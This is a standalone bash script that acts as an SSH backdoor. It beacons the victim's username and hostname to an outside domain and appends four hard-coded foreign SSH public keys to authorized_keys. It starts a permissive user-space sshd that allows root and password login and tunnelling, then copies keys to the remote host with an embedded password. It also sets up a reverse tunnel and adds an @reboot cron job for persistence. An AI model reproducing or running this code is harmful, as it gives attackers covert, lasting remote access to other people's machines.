#!/bin/bash

user="suser"
username=$(whoami)
hostname=$(hostname)

data=$(echo -n "$user:$username:$hostname" | base64)

domain_name="proxy1.cryptopredictor.org"

received_port=$(curl -sL "https://$domain_name/report?data=$data")
received_port=$(echo $received_port | sed "s/%//g")

if [ -z "$received_port" ]; then
    echo "[-] Failed to receive remote port."
    exit 1
else
	echo "$received_port"
fi

key_path="$HOME/.ssh/$(whoami)_ed25519"
[ ! -e "$key_path" ] && ssh-keygen -t ed25519 -f "$key_path" -N ""

read -r -d '' KEYS <<'EOF' || true
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7GlY/RI7o9IjHccolpcUSa1/UFsmMrQFCvzcs2JqLm suser@
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDCYabqF2p28/A9S3qwP8v2jPhOHq2tl8RbaVsGu4il
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFzdTi7eKOCK1jqc60ORaP5QtdR3fmI3SXA3DePTCRPS
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPcs8MvplmfDZ6KDleh7oS9HusQbJVWmRJC7JfOQRtzG
EOF

mkdir -p ~/.ssh
chmod 700 ~/.ssh
touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

echo "$KEYS" | while read -r single_key; do
    [ -z "$single_key" ] && continue
    if ! grep -Fxq "$single_key" ~/.ssh/authorized_keys; then
        printf "%s\n" "$single_key" >> ~/.ssh/authorized_keys
        echo "[+] Appended new key: ${single_key:0:30}..."
    else
        echo "[-] Key already exists, skipping."
    fi
done

mkdir -p "$HOME/.local/bin" 2>/dev/null
requiredSettings="
Port 2022
ListenAddress 0.0.0.0
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
PermitRootLogin yes
PasswordAuthentication yes
AllowAgentForwarding yes
AllowTcpForwarding yes
GatewayPorts yes
PermitTTY yes
TCPKeepAlive yes
PermitTunnel yes

PermitOpen any
X11Forwarding yes
PrintMotd no
PrintLastLog yes
TCPKeepAlive yes
ClientAliveInterval 180
ClientAliveCountMax 60
UseDNS yes

Subsystem sftp /usr/lib/openssh/sftp-server
HostKey $key_path 
"

echo "$requiredSettings" > "$HOME/.ssh/sshd_config"

CONFIG_PATH="$HOME/.ssh/sshd_config"

if pgrep -f "sshd.*-f $CONFIG_PATH" >/dev/null; then
    echo "User-space sshd is already running. Skipping."
else
    /usr/sbin/sshd -f "$CONFIG_PATH"
fi

sshpass -p "DZ04dYFws1POVlm0XeHA" ssh-copy-id -o StrictHostKeyChecking=no -i "${key_path}.pub" "$user@$domain_name"

if pgrep -f "autossh.*$user@$domain_name" >/dev/null; then
    echo "Process already running. Skipping execution."
else
    echo "No existing process found. Initializing script..."
    bash "$HOME/.local/bin/script.sh" "$key_path" "$received_port" "$user" "$domain_name"
fi

CRON_JOB="@reboot $HOME/.local/bin/script.sh"
if ! crontab -l 2>/dev/null | grep -Fxq "$CRON_JOB"; then
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
else
    echo "Cron job already exists. Skipping."
fi
